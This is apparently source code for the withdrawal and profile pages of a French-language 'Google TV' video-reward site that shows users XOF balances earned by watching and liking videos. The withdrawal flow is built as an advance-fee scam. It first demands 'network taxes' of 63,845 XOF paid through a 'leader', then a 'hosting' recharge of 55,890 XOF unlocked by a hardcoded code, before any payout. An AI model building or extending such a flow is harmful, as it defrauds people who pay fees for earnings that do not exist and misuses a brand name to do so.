  if (hostingStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 shadow-2xl sm:p-12"><div className="rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center sm:p-8"><h2 className="text-base font-black leading-7 text-white sm:text-lg">Nous vous recommandons de faire l'hébergement de votre compte Google TV avec une rechargement de <b>55 890 XOF</b> avant que vous puissiez effectuer votre retrait</h2></div><div className="mt-8 text-left"><WithdrawalField label="Code d'hébergement"><input type="text" value={hostingCode} onChange={(event) => { setHostingCode(event.target.value); setHostingError(null); }} placeholder="Saisissez le code d'hébergement" className="withdrawal-input" /></WithdrawalField>{hostingError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{hostingError}</p>}<button onClick={() => { if (hostingCode.trim().toUpperCase() === 'GTV-H88401') { setHostingStep(false); setHostingError(null); setHostedSuccess(true); } else { setHostingError('Le code d’hébergement est incorrect.'); } }} disabled={!hostingCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Valider l'hébergement</button></div></div></section>;

  if (validating) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Envoi de votre demande</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;

  const numericAmount = Number(amount);
  const canSubmit = balanceReady && !submitting && paymentMethod !== '' && withdrawalCountry !== '' && phone.trim() !== '' && numericAmount > 0 && numericAmount <= availableBalance;
  return <section className="py-9 sm:py-14"><div className="mx-auto max-w-3xl rounded-[30px] border border-blue-400/40 bg-[linear-gradient(145deg,#192c49,#102329)] px-5 py-8 text-center shadow-[0_20px_55px_rgba(24,87,120,.18)] sm:px-10"><p className="text-sm font-bold uppercase tracking-[.28em] text-blue-400">Solde disponible</p><p className="mt-5 text-5xl font-black tracking-tight text-white sm:text-7xl">{availableBalance.toLocaleString('fr-FR')} XOF</p><p className="mt-5 text-base text-slate-500 sm:text-lg"><b>{counts.rewarded}</b> vidéo(s) regardée(s), aimée(s) et ajoutée(s) aux favoris</p></div><div className="mx-auto mt-8 max-w-3xl rounded-[30px] border border-slate-400/20 bg-[#242c40] p-5 shadow-2xl sm:p-10"><h1 className="sr-only">Retrait</h1>{codeStep ? <div className="text-center"><h2 className="text-2xl font-black text-white">Vous n'aviez pas encore payé les taxes de réseau afin que votre demande de retrait soit validée.</h2>{!codeReady ? <div className="py-12"><Loader2 className="mx-auto h-10 w-10 animate-spin text-blue-400" /><p className="mt-5 text-slate-300">Préparation de la confirmation…</p></div> : <div className="mt-8 text-left"><p className="mb-6 text-sm leading-6 text-slate-300">Veuillez contacter votre leader pour payer les taxes de réseau : <b>63 845 XOF</b>.</p><WithdrawalField label="Code de retrait"><input type="text" autoComplete="one-time-code" value={withdrawalCode} onChange={(event) => setWithdrawalCode(event.target.value)} placeholder="Saisissez votre code" className="withdrawal-input" /></WithdrawalField>{errorMessage && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{errorMessage}</p>}<button onClick={proceedToHosting} disabled={submitting || !withdrawalCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">{submitting ? 'Vérification en cours…' : 'Confirmer le retrait'}</button></div>}</div> : <><WithdrawalField label="Moyen de paiement"><select value={paymentMethod} onChange={(event) => setPaymentMethod(event.target.value)} className="withdrawal-input"><option value="">-- Choisir un moyen de paiement --</option>{paymentMethods.map((method) => <option key={method}>{method}</option>)}</select></WithdrawalField><WithdrawalField label="Nom complet du bénéficiaire"><input value={beneficiary} readOnly className="withdrawal-input" /></WithdrawalField><div className="grid gap-5 sm:grid-cols-2"><WithdrawalField label="Pays"><select value={withdrawalCountry} onChange={(event) => { setWithdrawalCountry(event.target.value); setPaymentMethod(''); }} className="withdrawal-input"><option value="">-- Choisir un pays --</option>{countries.map((country) => <option key={country.name} value={country.name}>{country.name}</option>)}</select></WithdrawalField><WithdrawalField label="Ville"><input value={profile.city ?? '—'} readOnly className="withdrawal-input" /></WithdrawalField></div><WithdrawalField label="Numéro de compte Mobile Money"><div className="flex overflow-hidden rounded-2xl bg-[#0b0f16]"><span className="flex items-center border-r border-white/10 px-4 text-lg text-slate-400">{dialCode}</span><input type="tel" inputMode="numeric" value={phone} onChange={(event) => setPhone(event.target.value)} placeholder="77 000 00 00" className="withdrawal-input rounded-none bg-transparent" /></div></WithdrawalField><WithdrawalField label="Montant à retirer"><input type="number" min="1" value={amount} onChange={(event) => setAmount(event.target.value)} placeholder={`Ex : ${availableBalance.toLocaleString('fr-FR')}`} className="withdrawal-input" /></WithdrawalField>{errorMessage && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{errorMessage}</p>}<button onClick={beginSubmit} disabled={!canSubmit} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Continuer vers la confirmation</button></>}</div></section>;
}

function CertifiedBadge() { return <img src="/assets/icons/file_00000000f4308210a788b98916b52e8e.png" alt="Compte certifié" className="inline-block h-5 w-5 object-contain align-middle" />; }

function StatCard({ label, value }: { label: string; value: number }) { return <div className="rounded-2xl border border-white/10 bg-[#141a24] p-5"><p className="text-sm leading-6 text-slate-400">{label}</p><p className="mt-2 text-4xl font-black text-white">{value}</p></div>; }
function WithdrawalField({ label, children }: { label: string; children: ReactNode }) { return <label className="mb-6 block"><span className="mb-3 block text-sm font-bold uppercase tracking-[.1em] text-slate-300">{label}</span>{children}</label>; }
function ProfileTab({ profile, counts, onOpenHistory }: { profile: UserHomeProfile; counts: { watched: number; liked: number; favorited: number; rewarded: number }; onOpenHistory: () => void }) { const identifier = `ID-${profile.id.split('-').join('').slice(0, 15).toUpperCase()}`; const details = [['Numéro d’identification', identifier], ['Prénom', profile.first_name], ['Nom', profile.last_name], ['Adresse e-mail', profile.email ?? '—'], ['Téléphone', profile.phone ?? '—'], ['Pays', profile.country ?? '—'], ['Ville', profile.city ?? '—'], ['Date de naissance', profile.birth_date ?? '—'], ['Genre', profile.gender ?? '—']]; return <section className="mx-auto max-w-3xl py-12 sm:py-16"><p className="text-sm font-bold uppercase tracking-[.2em] text-blue-300">Mon compte</p><h1 className="mt-3 text-4xl font-black text-white">Profil</h1><p className="mt-3 flex items-center gap-2 text-xl font-bold text-white">{profile.first_name} {profile.last_name}{profile.is_certified && <CertifiedBadge />}</p><p className="mt-3 text-slate-400">Vos informations personnelles</p><div className="mt-8 grid gap-4 sm:grid-cols-4"><StatCard label="Vidéos regardées" value={counts.watched} /><StatCard label="Vidéos aimées" value={counts.liked} /><StatCard label="Favoris" value={counts.favorited} /><StatCard label="Récompenses validées" value={counts.rewarded} /></div><button onClick={onOpenHistory} className="mt-8 inline-flex w-full items-center justify-center gap-2 rounded-2xl border border-white/10 bg-[#141a24] px-5 py-4 font-bold text-white transition hover:border-blue-400/60 hover:bg-[#1a2233] sm:w-auto"><History className="h-5 w-5 text-blue-300" /> Historique des retraits</button><div className="mt-8 overflow-hidden rounded-3xl border border-white/10 bg-[#141a24]">{details.map(([label, value]) => <div key={label} className="flex flex-col gap-1 border-b border-white/10 px-5 py-4 last:border-0 sm:flex-row sm:items-center sm:justify-between sm:px-7"><span className="text-slate-400">{label}</span><span className="break-all font-semibold text-white sm:text-right">{value}</span></div>)}</div></section>; }

interface WithdrawalHistoryRow { id: string; amount: number; status: string; payment_method: string; phone: string; country: string; city: string; created_at: string; }

function WithdrawalHistory({ profileId, onClose }: { profileId: string; onClose: () => void }) {
  const [rows, setRows] = useState<WithdrawalHistoryRow[] | null>(null);
  const [error, setError] = useState<string | null>(null);
  useEffect(() => {
    let mounted = true;
    void supabase.from('withdrawal_requests').select('id, amount, status, payment_method, phone, country, city, created_at').eq('user_id', profileId).order('created_at', { ascending: false }).then(({ data, error: loadError }) => {
      if (!mounted) return;
      if (loadError) { setError('L’historique ne peut pas être chargé pour le moment.'); setRows([]); return; }
      setRows(data ?? []);
    });
    return () => { mounted = false; };
  }, [profileId]);
  const statusLabels: Record<string, { label: string; className: string }> = {
    pending: { label: 'En attente de validation', className: 'border-amber-300/30 bg-amber-300/10 text-amber-200' },
    approved: { label: 'Validé', className: 'border-green-400/30 bg-green-400/10 text-green-300' },
    rejected: { label: 'Refusé', className: 'border-red-400/30 bg-red-400/10 text-red-300' },
  };
  const dateFormatter = new Intl.DateTimeFormat('fr-FR', { dateStyle: 'short', timeStyle: 'short' });
  return <div className="fixed inset-0 z-50 overflow-y-auto bg-[#050a13]/95 p-4 sm:p-8" onClick={onClose}><div className="mx-auto w-full max-w-2xl rounded-3xl border border-white/10 bg-[#10151f] shadow-2xl" onClick={(event) => event.stopPropagation()}><div className="flex items-center justify-between border-b border-white/10 px-6 py-5"><h2 className="flex items-center gap-2 text-xl font-bold text-white"><History className="h-5 w-5 text-blue-300" /> Historique des retraits</h2><button onClick={onClose} aria-label="Fermer" className="rounded-full p-2 text-slate-400 hover:bg-white/10 hover:text-white"><X className="h-5 w-5" /></button></div><div className="p-6">{rows === null && !error ? <div className="py-10 text-center"><Loader2 className="mx-auto h-8 w-8 animate-spin text-blue-400" /></div> : error ? <p className="rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{error}</p> : (rows ?? []).length === 0 ? <p className="py-10 text-center text-slate-400">Aucun retrait effectué pour le moment.</p> : <div className="space-y-4">{(rows ?? []).map((row) => { const status = statusLabels[row.status] ?? { label: row.status, className: 'border-white/10 bg-white/5 text-slate-300' }; const isBank = /bancaire|bank|virement/i.test(row.payment_method); return <article key={row.id} className="rounded-2xl border border-white/10 bg-[#141a24] p-5"><div className="flex flex-wrap items-center justify-between gap-3"><p className="text-2xl font-black text-white">{row.amount.toLocaleString('fr-FR')} XOF</p><span className={`rounded-full border px-3 py-1 text-xs font-semibold ${status.className}`}>{status.label}</span></div><div className="mt-4 space-y-2 text-sm"><div className="flex flex-col gap-1 sm:flex-row sm:justify-between"><span className="text-slate-400">Moyen de paiement</span><span className="font-semibold text-white">{row.payment_method}{isBank && ' — retrait vers un compte bancaire'}</span></div>{isBank && <p className="rounded-xl border border-blue-400/30 bg-blue-400/10 px-3 py-2 text-xs font-semibold text-blue-200">Attention : ce retrait a été effectué vers un compte bancaire. Les délais de virement bancaire peuvent s’appliquer.</p>}{!isBank && <div className="flex flex-col gap-1 sm:flex-row sm:justify-between"><span className="text-slate-400">Numéro</span><span className="break-all font-semibold text-white">{getCountry(row.country)?.dialCode ?? '+'} {row.phone}</span></div>}<div className="flex flex-col gap-1 sm:flex-row sm:justify-between"><span className="text-slate-400">Date et heure</span><span className="font-semibold text-white">{dateFormatter.format(new Date(row.created_at))}</span></div><div className="flex flex-col gap-1 sm:flex-row sm:justify-between"><span className="text-slate-400">Localisation</span><span className="font-semibold text-white">{row.city}, {row.country}</span></div></div></article>; })}</div>}</div></div></div>;
}
